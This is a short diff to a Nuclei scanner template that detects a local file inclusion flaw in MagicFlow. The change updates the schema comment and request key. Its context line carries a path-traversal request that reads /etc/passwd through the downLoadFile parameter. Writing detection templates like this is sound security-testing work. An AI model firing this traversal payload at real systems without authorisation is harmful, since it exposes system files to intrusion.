@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: magicflow-lfi
 info:
   name: MagicFlow - Local File Inclusion
@@ -12,7 +13,7 @@ info:
     cvss-score: 8.6
     cwe-id: CWE-22
   tags: magicflow,lfi
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../../../../../../etc/passwd"
